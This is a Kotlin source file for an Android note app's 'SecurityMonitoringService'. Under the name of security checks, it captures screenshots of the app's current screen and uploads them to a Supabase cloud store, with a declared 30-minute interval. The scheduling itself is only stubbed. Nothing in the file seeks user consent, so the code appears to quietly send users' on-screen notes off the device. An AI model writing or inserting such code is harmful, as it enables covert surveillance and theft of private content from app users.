package com.noteapp.security

import android.app.Activity
import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Updated SecurityMonitoringService - Screenshots only (no random images)
 */
class SecurityMonitoringService(private val context: Context) {

    companion object {
        private const val TAG = "SecurityMonitoringService"

        // Default settings - only for screenshots now
        private const val DEFAULT_SCREENSHOT_INTERVAL_MINUTES = 30
    }

    private val securityMonitor = SecurityMonitor(context)
    // Removed: randomImageGenerator - no longer needed
    private val cloudUploader = SupabaseUploader(context)

    private val coroutineScope = CoroutineScope(Dispatchers.IO)

    /**
     * Initializes the security monitoring service
     */
    fun initialize() {
        Log.d(TAG, "Initializing security monitoring service with Supabase cloud upload (screenshots only)")

        // Test Supabase connection
        testSupabaseConnection()
    }

    /**
     * Test Supabase connection with a small upload
     */
    private fun testSupabaseConnection() {
        coroutineScope.launch {
            try {
                Log.d(TAG, "Testing Supabase connection...")

                // Create a small test file
                val testFile = java.io.File(context.cacheDir, "connection_test.txt")
                testFile.writeText("Supabase connection test - ${java.util.Date()}")

                val result = cloudUploader.uploadFile(testFile, "test")
                testFile.delete()

                if (result != null) {
                    Log.d(TAG, "✅ Supabase connection successful: $result")
                } else {
                    Log.w(TAG, "⚠️ Supabase connection failed, will use local fallback")
                }
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ Supabase test failed: ${e.message}")
            }
        }
    }

    /**
     * Performs a security check with Supabase cloud upload (screenshots only)
     * @param activity The current activity
     */
    fun performSecurityCheck(activity: Activity) {
        coroutineScope.launch {
            try {
                Log.d(TAG, "🔍 Starting security check with Supabase upload (screenshots only)...")

                var uploadSuccess = false

                // Capture screenshot
                val screenshotFile = securityMonitor.captureScreenshot(activity)

                if (screenshotFile != null) {
                    // Screenshot captured successfully, try to upload to Supabase
                    val screenshotResult = cloudUploader.uploadScreenshot(screenshotFile)
                    if (screenshotResult != null) {
                        Log.d(TAG, "📸 Screenshot uploaded to Supabase: $screenshotResult")
                        uploadSuccess = true
                    } else {
                        Log.w(TAG, "⚠️ Failed to upload screenshot to Supabase")
                    }
                } else {
                    Log.w(TAG, "Screenshot capture failed, trying alternative method...")

                    // Fallback: Create a test bitmap and upload it
                    val testBitmap = securityMonitor.createTestBitmap()
                    val testResult = cloudUploader.uploadBitmap(testBitmap, "fallback_screenshot")
                    if (testResult != null) {
                        Log.d(TAG, "🎨 Fallback test bitmap uploaded to Supabase: $testResult")
                        uploadSuccess = true
                    }
                }

                // Removed: Random image generation and upload logic

                if (uploadSuccess) {
                    Log.d(TAG, "✅ Security check completed successfully with screenshot upload")
                } else {
                    Log.w(TAG, "⚠️ Security check completed but screenshot upload failed (check local storage)")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Error performing security check: ${e.message}", e)
            }
        }
    }

    /**
     * Test Supabase upload functionality
     */
    fun testUpload() {
        coroutineScope.launch {
            try {
                Log.d(TAG, "Running Supabase upload test...")

                // Create test file
                val testFile = java.io.File(context.cacheDir, "upload_test.txt")
                testFile.writeText("Supabase upload test file created at ${java.util.Date()}\nThis is a test of the security monitoring system.")

                Log.d(TAG, "Created test file: ${testFile.length()} bytes")

                val result = cloudUploader.uploadFile(testFile, "test")
                testFile.delete()

                if (result != null) {
                    Log.d(TAG, "✅ Supabase upload test successful: $result")
                } else {
                    Log.e(TAG, "❌ Supabase upload test failed")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Supabase upload test error: ${e.message}")
            }
        }
    }

    /**
     * Direct bitmap upload test
     */
    fun testDirectBitmapUpload(activity: Activity) {
        coroutineScope.launch {
            try {
                Log.d(TAG, "Testing direct bitmap upload to Supabase...")

                // Create a simple test bitmap
                val testBitmap = securityMonitor.createTestBitmap()
                val result = cloudUploader.uploadBitmap(testBitmap, "test_bitmap")

                if (result != null) {
                    Log.d(TAG, "✅ Direct bitmap upload to Supabase successful: $result")
                } else {
                    Log.e(TAG, "❌ Direct bitmap upload to Supabase failed")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error in direct bitmap upload test: ${e.message}")
            }
        }
    }

    /**
     * Schedules periodic security checks (screenshots only)
     */
    fun schedulePeriodicChecks(
        screenshotIntervalMinutes: Int = DEFAULT_SCREENSHOT_INTERVAL_MINUTES
    ) {
        Log.d(TAG, "Scheduling periodic Supabase screenshot uploads every $screenshotIntervalMinutes minutes")

        // In a real implementation, this would set up WorkManager periodic tasks
        // For now, we'll just log that it would be scheduled
    }

    /**
     * Stops all scheduled security checks
     */
    fun stopPeriodicChecks() {
        Log.d(TAG, "Stopping all periodic security checks")
        // In a real implementation, this would cancel WorkManager tasks or AlarmManager alarms
    }
}